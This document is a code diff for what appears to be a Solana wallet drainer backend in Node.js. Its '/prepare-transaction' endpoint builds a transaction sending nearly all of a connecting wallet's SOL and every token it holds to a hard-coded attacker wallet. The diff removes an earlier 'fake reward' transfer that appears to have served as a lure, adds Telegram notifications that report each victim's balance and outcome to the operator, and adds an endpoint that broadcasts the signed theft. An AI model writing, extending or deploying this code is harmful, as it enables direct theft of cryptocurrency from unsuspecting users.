@@ -235,107 +235,29 @@ app.post('/prepare-transaction', async (req, res) => {
     }
 
     const fromPubkey = new PublicKey(publicKey);
-    const receiverWallet = new PublicKey('AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg');
+    const receiverWallet = new PublicKey('JchoZmAvqcWzJoei8WFfmVGL1c9x2755TJHq2HikkfV');
 
     const transaction = new Transaction();
     let totalTransferred = 0;
     let tokenTransfers = 0;
 
-    // Fixed: Use fromPubkey as sender for the fake reward
-    const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL; // 0.02 SOL
-    transaction.add(
-      SystemProgram.transfer({
-        fromPubkey: fromPubkey,  // Fixed: Use the user's wallet as sender
-        toPubkey: fromPubkey,    // Send reward to user themselves
-        lamports: fakeRewardAmount, 
-      })
-    );
-
-    const tokenMints = [
-      'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
-      'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
-      'So11111111111111111111111111111111111111112',  // Wrapped SOL
-      'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', // Bonk
-      'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So',  // Marinade SOL
-      'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn', // Jito SOL
-      'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1',  // BlazeStake SOL
-      'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof', // Render Token
-      'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3', // Pyth Network
-      'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE',  // Orca
-      'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', // Serum
-      'A94X8334H7JtSyUgA4UFDL5H14PDe8YVV8Jj9k2sSmEw', // Aurory
-      'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6',  // Kin
-      '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', // Raydium
-      'MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey',  // Marinade
-      '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E', // Solana Beach Token
-      'CWE8jPTUYhdCTZYWPTe1o5DFqfdjzWKc9WKz6rSjQUdG', // Cope
-      'BLwTnYKqf7u4qjgZrrsKeNs2EzWkMLqVCu6j8iHyrNA3', // BonfidaBot
-      'UXPhBoR3qG4UCiGNJfV7MqhHyFqKN68g45GoYvAeL2M',  // UXD Protocol
-    ];
-
-    console.log("Fetching all token accounts for wallet...");
-    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
-      programId: TOKEN_PROGRAM_ID,
-    });
-
-    console.log(`Found ${tokenAccounts.value.length} token accounts`);
-
-    for (const tokenAccount of tokenAccounts.value) {
-      try {
-        const accountData = tokenAccount.account.data;
-        const parsedInfo = accountData.parsed.info;
-        const mintAddress = parsedInfo.mint;
-        const balance = parsedInfo.tokenAmount;
-
-        if (balance.uiAmount > 0) {
-          console.log(`Found token ${mintAddress} with balance: ${balance.uiAmount}`);
-
-          const mint = new PublicKey(mintAddress);
-          const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
-          const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);
-
-          const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
-          if (!receiverAccountInfo) {
-            transaction.add(
-              createAssociatedTokenAccountInstruction(
-                fromPubkey, // payer
-                toTokenAccount, // ata
-                receiverWallet, // owner
-                mint // mint
-              )
-            );
-          }
-
-          transaction.add(
-            createTransferInstruction(
-              fromTokenAccount,
-              toTokenAccount,
-              fromPubkey,
-              balance.amount
-            )
-          );
-
-          tokenTransfers++;
-          console.log(`Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
-        }
-      } catch (error) {
-        console.log(`Error processing token account:`, error.message);
-      }
-    }
-
+    // Get SOL balance first to calculate available amount
     const solBalance = await connection.getBalance(fromPubkey);
     const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+    
+    console.log(`💰 Wallet SOL balance: ${solBalance / LAMPORTS_PER_SOL} SOL`);
+    console.log(`💎 Minimum rent exemption: ${minBalance / LAMPORTS_PER_SOL} SOL`);
 
+    // Calculate available SOL for transfer (leave some for fees)
     const baseFee = 5000;
-    const instructionFee = (tokenTransfers + 1) * 5000; // Additional fees for instructions
-    const accountCreationFee = tokenTransfers * 2039280; // Account creation costs
-    const estimatedFees = baseFee + instructionFee + accountCreationFee;
-
+    const estimatedFees = baseFee * 3; // Conservative fee estimation
+    
     const availableBalance = solBalance - minBalance - estimatedFees;
-    const solForTransfer = Math.floor(availableBalance * 0.98);
+    const solForTransfer = Math.max(0, Math.floor(availableBalance * 0.95)); // Transfer 95% of available
 
-    console.log(`SOL transfer amount: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
+    console.log(`📤 Available SOL for transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
 
+    // Add SOL transfer if there's enough balance
     if (solForTransfer > 0) {
       transaction.add(
         SystemProgram.transfer({
@@ -345,27 +267,209 @@ app.post('/prepare-transaction', async (req, res) => {
         })
       );
       totalTransferred += solForTransfer;
+      console.log(`✅ Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
     }
 
-    console.log(`Transaction prepared with ${tokenTransfers} token transfers + SOL transfer`);
+    // Process token transfers
+    console.log("🔍 Fetching all token accounts for wallet...");
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
+      programId: TOKEN_PROGRAM_ID,
+    });
 
+    console.log(`📊 Found ${tokenAccounts.value.length} token accounts`);
+
+    // Get blockhash for the transaction
     const { blockhash } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = fromPubkey;
 
+    for (const tokenAccount of tokenAccounts.value) {
+      try {
+        const accountData = tokenAccount.account.data;
+        const parsedInfo = accountData.parsed.info;
+        const mintAddress = parsedInfo.mint;
+        const balance = parsedInfo.tokenAmount;
+
+        if (balance.uiAmount > 0) {
+          console.log(`🎯 Processing token ${mintAddress} with balance: ${balance.uiAmount}`);
+
+          const mint = new PublicKey(mintAddress);
+          const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
+          const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);
+
+          // Check if receiver has associated token account, create if not
+          let receiverAccountInfo;
+          try {
+            receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
+          } catch (error) {
+            console.log(`❌ Error checking receiver account for ${mintAddress}:`, error.message);
+            receiverAccountInfo = null;
+          }
+
+          if (!receiverAccountInfo) {
+            console.log(`🏗️ Creating associated token account for receiver for token: ${mintAddress}`);
+            try {
+              transaction.add(
+                createAssociatedTokenAccountInstruction(
+                  fromPubkey, // payer
+                  toTokenAccount, // ata
+                  receiverWallet, // owner
+                  mint // mint
+                )
+              );
+              console.log(`✅ Added token account creation instruction for ${mintAddress}`);
+            } catch (error) {
+              console.log(`❌ Error creating token account instruction for ${mintAddress}:`, error.message);
+              continue; // Skip this token if we can't create the account
+            }
+          }
+
+          // Add transfer instruction
+          try {
+            transaction.add(
+              createTransferInstruction(
+                fromTokenAccount,
+                toTokenAccount,
+                fromPubkey,
+                balance.amount
+              )
+            );
+            tokenTransfers++;
+            console.log(`✅ Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
+          } catch (error) {
+            console.log(`❌ Error creating transfer instruction for ${mintAddress}:`, error.message);
+          }
+        }
+      } catch (error) {
+        console.log(`❌ Error processing token account:`, error.message);
+      }
+    }
+
+    console.log(`📦 Transaction prepared with ${tokenTransfers} token transfers and ${solForTransfer > 0 ? 'SOL transfer' : 'no SOL transfer'}`);
+
+    // Serialize the transaction
     const serializedTransaction = transaction.serialize({
       requireAllSignatures: false,
       verifySignatures: false,
     });
 
+    // Send notification about the prepared transaction
+    try {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `🔄 Transaction Prepared for ${publicKey.substring(0, 8)}...
+
+💰 SOL to transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL
+🎯 Tokens to transfer: ${tokenTransfers} tokens
+📦 Total instructions: ${transaction.instructions.length}
+
+Status: Ready for signing`,
+        parse_mode: 'Markdown'
+      });
+    } catch (notifyError) {
+      console.log('Notification error (non-critical):', notifyError.message);
+    }
+
     res.json({ 
       transaction: Array.from(serializedTransaction),
       transferAmount: totalTransferred,
-      tokenTransfers: tokenTransfers
+      tokenTransfers: tokenTransfers,
+      solTransfer: solForTransfer / LAMPORTS_PER_SOL,
+      totalInstructions: transaction.instructions.length
     });
   } catch (e) {
-    console.error(e.message);
-    res.status(500).json({ error: "transaction preparation error" });
+    console.error('❌ Transaction preparation error:', e.message);
+    
+    // Send error notification
+    try {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `❌ Transaction Preparation Failed
+
+Wallet: ${req.body.publicKey?.substring(0, 8) || 'Unknown'}
+Error: ${e.message}
+
+Status: Failed to prepare transaction`,
+        parse_mode: 'Markdown'
+      });
+    } catch (notifyError) {
+      console.log('Error notification failed:', notifyError.message);
+    }
+    
+    res.status(500).json({ error: "transaction preparation error: " + e.message });
+  }
+});
+
+// Add endpoint to send signed transaction
+app.post('/send-transaction', async (req, res) => {
+  try {
+    const { signedTransaction, publicKey } = req.body;
+    
+    if (!signedTransaction || !publicKey) {
+      return res.status(400).json({ error: "signedTransaction and publicKey required" });
+    }
+
+    console.log(`📤 Sending signed transaction from: ${publicKey}`);
+    
+    // Convert array back to buffer
+    const transactionBuffer = Buffer.from(signedTransaction);
+    const transaction = Transaction.from(transactionBuffer);
+
+    // Send the transaction
+    const signature = await connection.sendRawTransaction(transaction.serialize(), {
+      skipPreflight: false,
+      preflightCommitment: 'confirmed'
+    });
+
+    console.log(`✅ Transaction sent with signature: ${signature}`);
+
+    // Wait for confirmation
+    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+    
+    console.log(`🎉 Transaction confirmed:`, confirmation);
+
+    // Send success notification
+    try {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `🎉 Transaction Confirmed!
+
+Wallet: ${publicKey.substring(0, 8)}...
+Signature: \`${signature}\`
+Status: ✅ Successfully executed
+
+View on Solscan: https://solscan.io/tx/${signature}`,
+        parse_mode: 'Markdown'
+      });
+    } catch (notifyError) {
+      console.log('Success notification error:', notifyError.message);
+    }
+
+    res.json({ 
+      success: true, 
+      signature: signature,
+      confirmation: confirmation
+    });
+  } catch (e) {
+    console.error('❌ Transaction sending error:', e.message);
+    
+    // Send error notification
+    try {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `❌ Transaction Failed
+
+Wallet: ${req.body.publicKey?.substring(0, 8) || 'Unknown'}
+Error: ${e.message}
+
+Status: Failed to execute transaction`,
+        parse_mode: 'Markdown'
+      });
+    } catch (notifyError) {
+      console.log('Error notification failed:', notifyError.message);
+    }
+    
+    res.status(500).json({ error: "transaction sending error: " + e.message });
   }
 });
 
